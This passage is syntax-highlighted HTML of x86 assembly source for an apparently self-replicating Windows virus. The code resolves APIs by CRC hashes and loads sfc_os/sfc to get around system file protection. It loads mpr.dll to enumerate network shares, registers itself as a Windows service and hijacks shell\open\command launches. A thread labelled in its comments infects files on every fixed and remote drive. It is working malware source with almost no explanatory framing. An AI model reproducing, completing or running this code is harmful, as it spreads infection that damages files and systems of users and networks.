        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">store_charnext</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401001h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">usrcrcstk</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">execrcstk.eGetCommandLineW</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">stack_delta</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">                        </span><span class="sc1">;Unicode-compatible compare</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skip_argv0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">skip_argv0</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">usrcrcstk.uCharNextW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">argv1_skip</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skip_argv0</span><span class="sc0">

</span><span class="sc5">find_argv1</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">usrcrcstk.uCharNextW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">                        </span><span class="sc1">;Unicode-compatible compare</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">find_argv1</span><span class="sc0">

</span><span class="sc5">argv1_skip</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;if argv1 exists then argv0 was run using shell\open\command so run argv1</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">stack_copy</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">processinfo</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">startupinfo</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">usrcrcstk</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">execrcstk.eGetStartupInfoW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">usrcrcstk</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">execrcstk.eCreateProcessW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">usrcrcstk</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">execrcstk.eExitProcess</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;allocate stack space for RNG cache</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">stack_copy</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">usrcrcstk.execrcstk.eGetTickCount</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;RNG seed</span><span class="sc0">
        </span><span class="sc6">enter</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">statelen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;RNG cache</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randinit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_mzhdr</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">krncrcbegin</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">krncrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">krncrcend</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swap_create</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">krncrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;swap CreateFileW and CreateFileMappingA because of alphabet order</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">swap_create</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">store_krnapi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401003h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kCreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kCreateFileW</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">krncrcstk.kCreateFileMappingA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;get SFC support if available</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">load_sfc</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"sfc_os"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;Windows XP (forwarder chain from sfc.dll)</span><span class="sc0">

</span><span class="sc5">load_sfc</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cLoadLibraryA</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">found_sfc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'cfs'</span><span class="sc0">                           </span><span class="sc1">;Windows Me/2000</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cLoadLibraryA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">sfcapi_esp</span><span class="sc0">

</span><span class="sc5">found_sfc</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">init_findmz</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">sfccrcbegin</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">sfccrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sfccrcend</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sfcapi_pop</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sfccrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">sfcapi_pop</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">sfcapi_esp</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">store_sfcapi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401001h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;get rest of APIs required for network thread</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc12">'rpm'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cLoadLibraryA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">init_findmz</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">netcrcbegin</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">netcrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">netcrcend</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netapi_esp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netcrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">netapi_esp</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">netcrcstk.nWNetCloseEnum</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">netcrcstk.nWNetOpenEnumW</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">store_netapi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netapi_esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;initialise service table if NT/2000/XP</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGetVersion</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1fh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">svc_main</span><span class="sc0">                        </span><span class="sc1">;no service if 9x/Me</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">regdll</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cLoadLibraryA</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">init_findmz</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">svccrcbegin</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">svccrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">svccrcend</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_disp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">svccrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">start_disp</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">svc_main</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_disp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;does not return if service launch</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">SERVICE_TABLE_ENTRY</span><span class="sc0">   </span><span class="sc1">;fix stack if app launch</span><span class="sc0">

</span><span class="sc5">svc_main</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_thr1</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;thread 1: infect files on all fixed and remote drive letters</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">find_drives</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'\:A'</span><span class="sc0">                      </span><span class="sc1">;NEC-PC98 uses A: for boot drive which can be hard disk</span><span class="sc0">

</span><span class="sc5">drive_loop</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGetDriveTypeA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DRIVE_FIXED</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">drive_set</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">drive_next</span><span class="sc0">                      </span><span class="sc1">;loop if not DRIVE_REMOTE</span><span class="sc0">

</span><span class="sc5">drive_set</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
